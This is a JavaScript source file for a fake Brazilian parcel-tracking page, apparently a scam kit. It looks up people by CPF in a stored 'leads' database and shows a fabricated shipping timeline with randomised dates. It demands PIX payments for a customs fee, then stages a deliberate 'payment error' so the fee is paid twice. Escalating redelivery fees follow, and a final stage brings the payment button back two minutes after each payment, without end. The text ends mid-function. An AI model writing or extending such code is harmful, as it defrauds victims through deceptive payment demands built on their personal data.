/**
 * Sistema de rastreamento - VERSÃO 17.2: 29 ETAPAS COMPLETAS
 * Sistema robusto com reconexão automática e etapas detalhadas
 */
import { CPFValidator } from '../utils/cpf-validator.js';
import { DataService } from '../utils/data-service.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { DatabaseService } from '../services/database.js';

export class TrackingSystem {
    constructor() {
        this.isInitialized = false;
        this.currentCPF = null;
        this.userData = null;
        this.leadData = null;
        this.trackingData = null;
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.dbService = new DatabaseService();
        this.liberationAttempts = 0;
        this.maxLiberationAttempts = 2;
        this.deliveryAttempts = 0;
        this.currentStage = 1;
        this.isLiberationPaid = false;
        this.paymentTimers = new Map();
        
        console.log('🚀 TrackingSystem inicializado - Versão 17.2 com 29 Etapas');
        console.log('🎯 Fonte de dados: Supabase com reconexão automática');
        this.init();
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🔧 Inicializando sistema de rastreamento...');
        
        try {
            this.setupEventListeners();
            this.setupCPFMask();
            this.checkURLParams();
            this.isInitialized = true;
            
            console.log('✅ Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    setupEventListeners() {
        const form = document.getElementById('trackingForm');
        if (form) {
            form.addEventListener('submit', (e) => this.handleFormSubmit(e));
        }

        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => this.toggleOrderDetails());
        }

        this.setupLiberationModal();
    }

    setupCPFMask() {
        const cpfInput = document.getElementById('cpfInput');
        if (cpfInput) {
            cpfInput.addEventListener('input', (e) => {
                CPFValidator.applyCPFMask(e.target);
            });
        }
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusCPF = urlParams.get('focus') === 'cpf';
        
        if (focusCPF) {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                }
            }, 500);
        }
    }

    async handleFormSubmit(e) {
        e.preventDefault();
        
        const cpf = document.getElementById('cpfInput').value.replace(/[^\d]/g, '');
        
        if (!CPFValidator.isValidCPF(cpf)) {
            this.showError('CPF inválido. Verifique os dados e tente novamente.');
            return;
        }

        this.currentCPF = cpf;
        await this.performTracking();
    }

    async performTracking() {
        console.log('🔍 Iniciando rastreamento para CPF:', this.currentCPF);
        console.log('🎯 Buscando dados no Supabase...');
        
        
        // Mostrar loading
        this.showLoadingNotification();
        
        try {
            // Buscar no Supabase primeiro
            // Buscar dados no Supabase primeiro
            console.log('🔍 Buscando lead no Supabase...');
            const leadResult = await this.dbService.getLeadByCPF(this.currentCPF);
            if (leadResult.success && leadResult.data) {
                // Lead encontrado no Supabase
                console.log('✅ Lead encontrado no Supabase:', leadResult.data);
                this.setupUserDataFromLead(leadResult.data);
                this.closeLoadingNotification();
                this.displayResults();
                
                // Verificar se está na etapa 12 (erro de pagamento)
                if (this.leadData.etapa_atual === 12) {
                    setTimeout(() => {
                        this.showPaymentErrorModal();
                    }, 1000);
                }
                
            } else {
                console.log('❌ CPF não encontrado no Supabase');
                this.closeLoadingNotification();
                    // CPF não encontrado
                    this.closeLoadingNotification();
                    this.showCPFNotFoundFlow();
            }
            
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            this.closeLoadingNotification();
            this.showCPFNotFoundFlow();
        }
    }

    setupUserDataFromLead(leadData) {
        this.userData = {
            nome: leadData.nome_completo,
            cpf: this.currentCPF,
            email: leadData.email,
            telefone: leadData.telefone,
            endereco: leadData.endereco,
            nascimento: this.generateBirthDate(this.currentCPF),
            situacao: 'REGULAR'
        };
        this.leadData = leadData;
        
        console.log('📦 Dados do usuário configurados (Supabase):', this.userData);
        console.log('📦 Etapa atual do lead:', this.leadData.etapa_atual);
    }

    setupUserDataFromAPI(apiData) {
        this.userData = {
            nome: apiData.nome,
            cpf: this.currentCPF,
            email: null,
            telefone: null,
            endereco: null,
            nascimento: apiData.nascimento,
            situacao: apiData.situacao || 'REGULAR'
        };
        this.leadData = null;
        
        console.log('✅ Dados obtidos via API externa:', this.userData);
    }

    showCPFNotFoundFlow() {
        this.showError('CPF não identificado ou CPF inválido');
        
        // Após 2 segundos, mostrar popup
        setTimeout(() => {
            this.showNotFoundPopup();
        }, 2000);
    }

    showNotFoundPopup() {
        const popup = document.createElement('div');
        popup.id = 'notFoundPopup';
        popup.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            border: 2px solid #1e4a6b;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            max-width: 300px;
            animation: slideInRight 0.3s ease;
            cursor: pointer;
        `;
        
        popup.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                <i class="fas fa-search" style="color: #1e4a6b; font-size: 1.2rem;"></i>
                <strong style="color: #2c3e50;">Não encontrou sua encomenda?</strong>
            </div>
            <p style="margin: 0; color: #666; font-size: 0.9rem;">
                Clique aqui para verificar
            </p>
        `;
        
        popup.addEventListener('click', () => {
            window.location.href = 'https://logixexpresscom.netlify.app/';
        });
        
        document.body.appendChild(popup);
        
        // Auto-remover após 10 segundos
        setTimeout(() => {
            if (popup.parentNode) {
                popup.style.animation = 'slideOutRight 0.3s ease';
                setTimeout(() => popup.remove(), 300);
            }
        }, 10000);
    }

    showCPFNotFoundError() {
        console.log('🚫 Exibindo erro de CPF não identificado');
        
        this.hideResults();
        this.showError('CPF não identificado ou CPF inválido');
        
        setTimeout(() => {
            this.showNotFoundPopup();
        }, 2000);
    }

    showNotFoundPopup() {
        console.log('💬 Exibindo pop-up de não encontrado');
        
        const popup = document.createElement('div');
        popup.id = 'notFoundPopup';
        popup.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #fff;
            border: 2px solid #1e4a6b;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
            z-index: 2000;
            max-width: 300px;
            cursor: pointer;
            animation: slideInRight 0.4s ease;
            transition: all 0.3s ease;
        `;
        
        popup.innerHTML = `
            <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 10px;">
                <i class="fas fa-search" style="color: #1e4a6b; font-size: 1.2rem;"></i>
                <h4 style="margin: 0; color: #2c3e50; font-size: 1rem; font-weight: 600;">
                    Não encontrou sua encomenda?
                </h4>
            </div>
            <p style="margin: 0; color: #666; font-size: 0.9rem; line-height: 1.4;">
                Clique aqui para verificar
            </p>
            <div style="position: absolute; top: 8px; right: 8px;">
                <button id="closeNotFoundPopup" style="
                    background: none; 
                    border: none; 
                    color: #999; 
                    font-size: 1rem; 
                    cursor: pointer;
                    width: 20px;
                    height: 20px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                ">
                    <i class="fas fa-times"></i>
                </button>
            </div>
        `;
        
        // Adicionar animação CSS
        if (!document.getElementById('popupAnimations')) {
            const style = document.createElement('style');
            style.id = 'popupAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { opacity: 0; transform: translateX(100%); }
                    to { opacity: 1; transform: translateX(0); }
                }
                @keyframes slideOutRight {
                    from { opacity: 1; transform: translateX(0); }
                    to { opacity: 0; transform: translateX(100%); }
                }
            `;
            document.head.appendChild(style);
        }
        
        // Eventos
        popup.addEventListener('click', (e) => {
            if (e.target.id !== 'closeNotFoundPopup') {
                window.location.href = 'https://logixexpresscom.netlify.app/';
            }
        });
        
        popup.addEventListener('mouseenter', () => {
            popup.style.transform = 'scale(1.02)';
            popup.style.boxShadow = '0 12px 35px rgba(0, 0, 0, 0.3)';
        });
        
        popup.addEventListener('mouseleave', () => {
            popup.style.transform = 'scale(1)';
            popup.style.boxShadow = '0 8px 25px rgba(0, 0, 0, 0.2)';
        });
        
        const closeButton = popup.querySelector('#closeNotFoundPopup');
        if (closeButton) {
            closeButton.addEventListener('click', (e) => {
                e.stopPropagation();
                this.closeNotFoundPopup();
            });
        }
        
        document.body.appendChild(popup);
        
        setTimeout(() => {
            this.closeNotFoundPopup();
        }, 10000);
    }

    closeNotFoundPopup() {
        const popup = document.getElementById('notFoundPopup');
        if (popup) {
            popup.style.animation = 'slideOutRight 0.4s ease';
            setTimeout(() => {
                if (popup.parentNode) {
                    popup.remove();
                }
            }, 400);
        }
    }

    hideResults() {
        const orderDetails = document.getElementById('orderDetails');
        const trackingResults = document.getElementById('trackingResults');
        
        if (orderDetails) orderDetails.style.display = 'none';
        if (trackingResults) trackingResults.style.display = 'none';
    }

    generateBirthDate(cpf) {
        const cleanCPF = cpf.replace(/[^\d]/g, '');
        const year = 1960 + (parseInt(cleanCPF.slice(0, 2)) % 40);
        const month = (parseInt(cleanCPF.slice(2, 4)) % 12) + 1;
        const day = (parseInt(cleanCPF.slice(4, 6)) % 28) + 1;
        
        return `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
    }

    generateTrackingData() {
        const today = new Date();
        const dates = this.generateRealisticDates(today, 29);
        
        // Determinar etapa atual baseada nos dados do Supabase
        let currentStep = 11; // Padrão: alfândega
        if (this.leadData && this.leadData.etapa_atual) {
            currentStep = Math.min(this.leadData.etapa_atual, 29);
        }
        
        // Verificar se liberação já foi paga
        if (this.leadData && this.leadData.status_pagamento === 'pago') {
            this.isLiberationPaid = true;
            currentStep = Math.max(currentStep, 13);
        }
        
        this.trackingData = {
            currentStep: currentStep,
            steps: this.getAll29Steps(dates, currentStep)
        };
        
        console.log('📊 Dados de rastreamento gerados:', {
            currentStep: currentStep,
            totalSteps: this.trackingData.steps.length,
            liberationPaid: this.isLiberationPaid
        });
    }

    getAll29Steps(dates, currentStep) {
        const steps = [
            { id: 1, title: 'Seu pedido foi criado', description: 'Seu pedido foi criado' },
            { id: 2, title: 'Preparando para envio', description: 'O seu pedido está sendo preparado para envio' },
            { id: 3, title: 'Pedido enviado', description: '[China] O vendedor enviou seu pedido', isChina: true },
            { id: 4, title: 'Centro de triagem', description: '[China] O pedido chegou ao centro de triagem de Shenzhen', isChina: true },
            { id: 5, title: 'Centro logístico', description: '[China] Pedido saiu do centro logístico de Shenzhen', isChina: true },
            { id: 6, title: 'Trânsito internacional', description: '[China] Coletado. O pedido está em trânsito internacional', isChina: true },
            { id: 7, title: 'Liberado para exportação', description: '[China] O pedido foi liberado na alfândega de exportação', isChina: true },
            { id: 8, title: 'Saiu da origem', description: 'Pedido saiu da origem: Shenzhen' },
            { id: 9, title: 'Chegou no Brasil', description: 'Pedido chegou no Brasil' },
            { id: 10, title: 'Centro de distribuição', description: 'Pedido em trânsito para CURITIBA/PR' },
            { id: 11, title: 'Alfândega de importação', description: 'Pedido chegou na alfândega de importação: CURITIBA/PR', needsLiberation: true },
            { id: 12, title: 'Erro de pagamento', description: 'Simulação de erro de pagamento', isPaymentError: true },
            { id: 13, title: 'Pedido liberado', description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária' },
            { id: 14, title: 'Preparando entrega', description: 'Pedido sairá para entrega' },
            { id: 15, title: 'Em trânsito', description: 'Pedido em trânsito para o destinatário' },
            { id: 16, title: 'Rota de entrega', description: 'Pedido em Rota de Entrega' },
            { id: 17, title: 'Tentativa de entrega 1', description: 'Tentativa de Entrega', needsDeliveryPayment: true, deliveryValue: 9.74, attemptNumber: 1 },
            { id: 18, title: 'Liberado para entrega', description: 'Pedido liberado para nova tentativa de entrega' },
            { id: 19, title: 'Em trânsito', description: 'Pedido em trânsito' },
            { id: 20, title: 'Rota de entrega', description: 'Em rota de entrega' },
            { id: 21, title: 'Tentativa de entrega 2', description: 'Tentativa de Entrega - 2ª tentativa', needsDeliveryPayment: true, deliveryValue: 14.98, attemptNumber: 2 },
            { id: 22, title: 'Liberado para entrega', description: 'Pedido liberado para nova tentativa de entrega' },
            { id: 23, title: 'Em trânsito', description: 'Pedido em trânsito' },
            { id: 24, title: 'Rota de entrega', description: 'Em rota de entrega' },
            { id: 25, title: 'Tentativa de entrega 3', description: 'Tentativa de Entrega - 3ª tentativa', needsDeliveryPayment: true, deliveryValue: 18.96, attemptNumber: 3 },
            { id: 26, title: 'Liberado para entrega', description: 'Pedido liberado para nova tentativa de entrega' },
            { id: 27, title: 'Em trânsito', description: 'Pedido em trânsito' },
            { id: 28, title: 'Rota de entrega', description: 'Em rota de entrega' },
            { id: 29, title: 'Tentativa de entrega final', description: 'Tentativa de Entrega', needsDeliveryPayment: true, deliveryValue: 9.74, attemptNumber: 4, isLoopingStage: true }
        ];

        return steps.map((step, index) => ({
            ...step,
            date: dates[Math.min(index, dates.length - 1)],
            completed: currentStep >= step.id
        }));
    }

    displayResults() {
        this.displayOrderDetails();
        this.generateTrackingData();
        this.displayTrackingResults();
        
        const orderDetails = document.getElementById('orderDetails');
        if (orderDetails) {
            setTimeout(() => {
                orderDetails.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }
    }

    displayOrderDetails() {
        const orderDetails = document.getElementById('orderDetails');
        const customerName = document.getElementById('customerName');
        const fullName = document.getElementById('fullName');
        const formattedCpf = document.getElementById('formattedCpf');
        const customerProduct = document.getElementById('customerProduct');
        const customerFullAddress = document.getElementById('customerFullAddress');
        
        if (orderDetails) {
            orderDetails.style.display = 'block';
        }
        
        if (customerName) {
            customerName.textContent = this.userData.nome;
        }
        
        if (fullName) {
            fullName.textContent = this.userData.nome;
        }
        
        if (formattedCpf) {
            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
        }
        
        // Exibir produto do lead
        if (customerProduct && this.leadData && this.leadData.produtos) {
            const produtos = Array.isArray(this.leadData.produtos) ? this.leadData.produtos : [];
            const produtoNome = produtos.length > 0 ? produtos[0].nome : 'Kit 12 caixas organizadoras + brinde';
            customerProduct.textContent = produtoNome;
        }
        
        // Exibir endereço completo do lead
        if (customerFullAddress && this.leadData && this.leadData.endereco) {
            customerFullAddress.textContent = this.leadData.endereco;
        } else if (customerFullAddress) {
            customerFullAddress.textContent = this.userData.endereco || 'Endereço não informado';
        }
    }

    displayTrackingResults() {
        const trackingResults = document.getElementById('trackingResults');
        const customerNameStatus = document.getElementById('customerNameStatus');
        const currentStatus = document.getElementById('currentStatus');
        
        if (trackingResults) {
            trackingResults.style.display = 'block';
        }
        
        if (customerNameStatus) {
            customerNameStatus.textContent = this.userData.nome;
        }
        
        if (currentStatus) {
            const statusText = this.getStatusText(this.leadData.etapa_atual);
            currentStatus.textContent = statusText;
        }
        
        this.renderTimeline();
    }

    getStatusText(etapa) {
        const statusMap = {
            1: 'Pedido criado',
            2: 'Preparando para envio',
            3: 'Enviado da China',
            4: 'Em trânsito internacional',
            5: 'Em trânsito internacional',
            6: 'Em trânsito internacional',
            7: 'Liberado para exportação',
            8: 'Saiu da origem',
            9: 'Chegou no Brasil',
            10: 'Em trânsito nacional',
            11: 'Aguardando liberação aduaneira',
            12: 'Erro no pagamento - ação necessária',
            13: 'Liberado na alfândega',
            14: 'Preparando entrega',
            15: 'Em trânsito para entrega',
            16: 'Em rota de entrega',
            17: 'Tentativa de entrega - ação necessária',
            18: 'Liberado para nova entrega',
            19: 'Em trânsito',
            20: 'Em rota de entrega',
            21: 'Tentativa de entrega - ação necessária',
            22: 'Liberado para nova entrega',
            23: 'Em trânsito',
            24: 'Em rota de entrega',
            25: 'Tentativa de entrega - ação necessária',
            26: 'Liberado para nova entrega',
            27: 'Em trânsito',
            28: 'Em rota de entrega',
            29: 'Tentativa de entrega - ação necessária'
        };
        
        return statusMap[etapa] || 'Status não identificado';
    }

    generateRealisticDates(endDate, numSteps) {
        const dates = [];
        const now = new Date();
        const today = new Date(endDate);
        
        const day1 = new Date(today);
        day1.setDate(day1.getDate() - 2);
        dates.push(this.getRandomTimeOnDate(day1));
        dates.push(this.getRandomTimeOnDate(day1));
        
        const day2 = new Date(today);
        day2.setDate(day2.getDate() - 1);
        for (let i = 2; i < 9; i++) {
            dates.push(this.getRandomTimeOnDate(day2));
        }
        
        dates.push(this.getTimeBeforeNow(today, now, 1));
        dates.push(this.getTimeBeforeNow(today, now, 2));
        
        // Preencher datas restantes para as 29 etapas
        for (let i = 11; i < numSteps; i++) {
            dates.push(new Date(today.getTime() + (i - 10) * 60 * 60 * 1000));
        }
        
        return dates;
    }

    getRandomTimeOnDate(date) {
        const newDate = new Date(date);
        const hour = Math.floor(Math.random() * 18) + 5;
        const minute = Math.floor(Math.random() * 60);
        newDate.setHours(hour, minute, 0, 0);
        return newDate;
    }

    getTimeBeforeNow(targetDate, currentTime, stepOrder) {
        const newDate = new Date(targetDate);
        const currentHour = currentTime.getHours();
        
        let hoursBack;
        if (stepOrder === 1) {
            hoursBack = Math.floor(Math.random() * 4) + 2;
        } else {
            hoursBack = Math.random() * 1.5 + 0.5;
        }
        
        const targetTime = new Date(currentTime);
        targetTime.setHours(targetTime.getHours() - hoursBack);
        
        if (targetTime.getHours() < 6) {
            targetTime.setHours(6 + Math.floor(Math.random() * 2));
            targetTime.setMinutes(Math.floor(Math.random() * 60));
        }
        
        newDate.setHours(targetTime.getHours(), targetTime.getMinutes(), 0, 0);
        return newDate;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        timeline.innerHTML = '';
        
        this.trackingData.steps.forEach((step, index) => {
            const timelineItem = this.createTimelineItem(step, index);
            timeline.appendChild(timelineItem);
            
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, index * 100);
        });
    }

    createTimelineItem(step, index) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        
        let buttonHtml = '';
        
        // Botão de liberação na etapa 11
        if (step.id === 11 && step.needsLiberation && step.completed && !this.isLiberationPaid) {
            buttonHtml = `
                <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
                    <i class="fas fa-unlock"></i> Liberar Objeto
                </button>
            `;
        }
        
        // Botão de erro de pagamento na etapa 12
        if (step.id === 12 && step.isPaymentError && step.completed && !this.isLiberationPaid) {
            buttonHtml = `
                <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showPaymentErrorModal()">
                    <i class="fas fa-redo"></i> Tentar Novamente
                </button>
            `;
        }
        
        // Botões de tentativa de entrega
        if (step.needsDeliveryPayment && step.completed) {
            const buttonId = `deliveryBtn_${step.id}`;
            buttonHtml = `
                <button class="liberation-button-timeline delivery-retry-btn" id="${buttonId}" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id}, ${step.deliveryValue}, ${step.attemptNumber}, ${step.isLoopingStage || false})">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `;
        }
        
        const chinaTag = step.isChina ? '<span class="china-tag">China</span>' : '';
        
        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${chinaTag}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;
        
        return item;
    }

    showPaymentErrorModal() {
        console.log('❌ Exibindo modal de erro de pagamento (Etapa 12)');
        this.showLiberationModal(true);
    }

    showLiberationModal(isRetry = false) {
        console.log('🔓 Abrindo modal de liberação aduaneira', isRetry ? '(Tentativa)' : '');
        
        this.generateLiberationPix();
        
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            const title = modal.querySelector('.professional-modal-title');
            if (title && isRetry) {
                title.textContent = 'Erro no Pagamento - Tente Novamente';
            } else if (title) {
                title.textContent = 'Liberação Aduaneira Necessária';
            }
            
            const simulateButton = document.getElementById('simulatePaymentButton');
            if (simulateButton) {
                simulateButton.innerHTML = '<i class="fas fa-credit-card"></i> Simular Pagamento';
                simulateButton.removeAttribute('data-retry');
            }
        }
    }

    async showDeliveryModal(stepId, deliveryValue, attemptNumber, isLoopingStage = false) {
        console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - Tentativa ${attemptNumber} - R$ ${deliveryValue.toFixed(2)}`);
        
        if (isLoopingStage) {
            console.log('🔄 Etapa com loop infinito detectada');
        }
        
        if (this.userData) {
            try {
                const pixResult = await this.zentraPayService.generatePixForStage(
                    this.userData,
                    this.getDeliveryStageType(attemptNumber)
                );
                
                if (pixResult.success) {
                    console.log('✅ PIX de tentativa de entrega gerado automaticamente!');
                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, pixResult, isLoopingStage);
                } else {
                    console.warn('⚠️ Falha ao gerar PIX, usando modal estático');
                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
                }
                
            } catch (error) {
                console.error('❌ Erro ao gerar PIX de entrega:', error);
                this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
            }
        } else {
            console.warn('⚠️ Dados do usuário não disponíveis');
            this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
        }
    }

    getDeliveryStageType(attemptNumber) {
        const stageMap = {
            1: 'tentativa_entrega_1',
            2: 'tentativa_entrega_2', 
            3: 'tentativa_entrega_3',
            4: 'tentativa_entrega_1' // Loop volta para primeira
        };
        return stageMap[attemptNumber] || 'tentativa_entrega_1';
    }

    showDeliveryPixModal(stepId, value, attemptNumber, pixResult, isLoopingStage = false) {
        console.log(`💳 Exibindo modal de PIX - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
        
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPixModal';
        modal.style.display = 'flex';
        
        const qrCodeSrc = pixResult && pixResult.qrCode ? 
            pixResult.qrCode : 
            `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult?.pixPayload || 'PIX_ESTATICO')}`;
        
        const pixPayload = pixResult?.pixPayload || '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
        
        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
                    <button class="professional-modal-close" onclick="window.trackingSystemInstance.closeDeliveryModal()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" onclick="window.trackingSystemInstance.copyDeliveryPixCode()">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div style="text-align: center; margin-top: 20px;">
                            <button onclick="window.trackingSystemInstance.handleDeliveryPayment(${stepId}, ${attemptNumber}, ${isLoopingStage})" class="liberation-button-timeline">
                                <i class="fas fa-credit-card"></i> Simular Pagamento de Entrega
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
    }

    closeDeliveryModal() {
        const modal = document.getElementById('deliveryPixModal');
        if (modal) {
            modal.remove();
            document.body.style.overflow = 'auto';
        }
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.querySelector('#deliveryPixModal .professional-copy-button');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    handleDeliveryPayment(stepId, attemptNumber, isLoopingStage) {
        console.log(`💳 Processando pagamento de entrega - Tentativa ${attemptNumber}`);
        
        this.closeDeliveryModal();
        
        if (isLoopingStage) {
            this.handleLoopingStagePayment(stepId);
        } else {
            this.advanceToNextStage(stepId + 1);
        }
    }

    handleLoopingStagePayment(stepId) {
        console.log('🔄 Processando pagamento da etapa com loop (29)');
        
        const button = document.getElementById(`deliveryBtn_${stepId}`);
        if (button) {
            button.style.display = 'none';
            
            this.showPaymentConfirmedNotification();
            
            // Salvar timer para poder cancelar se necessário
            const timerId = setTimeout(() => {
                button.style.display = 'inline-flex';
                console.log('🔄 Botão de reenvio reativado após 2 minutos');
                this.paymentTimers.delete(stepId);
            }, 2 * 60 * 1000);
            
            this.paymentTimers.set(stepId, timerId);
        }
    }

    showPaymentConfirmedNotification() {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #d4edda;
            color: #155724;
            padding: 15px 20px;
            border-radius: 8px;
            border: 1px solid #c3e6cb;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            z-index: 2000;
            animation: slideInRight 0.4s ease;
            max-width: 300px;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <i class="fas fa-check-circle" style="color: #28a745; font-size: 1.2rem;"></i>
                <div>
                    <strong>Pagamento Confirmado</strong>
                    <p style="margin: 0; font-size: 0.9rem;">Objeto liberado para nova tentativa</p>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOutRight 0.4s ease';
                setTimeout(() => notification.remove(), 400);
            }
        }, 5000);
    }

    advanceToNextStage(nextStepId) {
        console.log(`📈 Avançando para etapa ${nextStepId}`);
        
        if (this.currentCPF) {
            this.dbService.updateLeadStage(this.currentCPF, nextStepId);
        }
        
        setTimeout(() => {
            this.generateTrackingData();
            this.renderTimeline();
        }, 1000);
    }

    setupLiberationModal() {
        const closeButton = document.getElementById('closeModal');
        const modal = document.getElementById('liberationModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        const simulateButton = document.getElementById('simulatePaymentButton');
        
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }
        
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeLiberationModal();
                }
            });
        }
        
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }
        
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.handleLiberationPayment();
            });
        }
    }

    async generateLiberationPix() {
        console.log('🔄 Gerando PIX automático para Taxa Alfandegária...');
        
        if (!this.userData) {
            console.error('❌ Dados do usuário não disponíveis para gerar PIX');
            return;
        }

        try {
            this.showPixGenerationIndicator();
            
            const pixResult = await this.zentraPayService.generatePixForStage(
                this.userData, 
                'taxa_alfandegaria'
            );
            
            if (pixResult.success) {
                console.log('✅ PIX da Taxa Alfandegária gerado automaticamente!');
                this.updateModalWithRealPix(pixResult);
                this.hidePixGenerationIndicator();
            } else {
                console.warn('⚠️ Falha ao gerar PIX, usando dados estáticos');
                this.hidePixGenerationIndicator();
            }
            
        } catch (error) {
            console.error('❌ Erro ao gerar PIX automático:', error);
            this.hidePixGenerationIndicator();
        }
    }

    showPixGenerationIndicator() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        
        if (qrCodeImg) {
            qrCodeImg.style.opacity = '0.5';
            qrCodeImg.style.filter = 'blur(2px)';
        }
        
        if (pixCodeTextarea) {
            pixCodeTextarea.value = 'Gerando código PIX automático...';
            pixCodeTextarea.style.opacity = '0.7';
        }
        
        const modal = document.getElementById('liberationModal');
        if (modal && !document.getElementById('pixLoadingIndicator')) {
            const indicator = document.createElement('div');
            indicator.id = 'pixLoadingIndicator';
            indicator.style.cssText = `
                position: absolute;
                top: 50%;
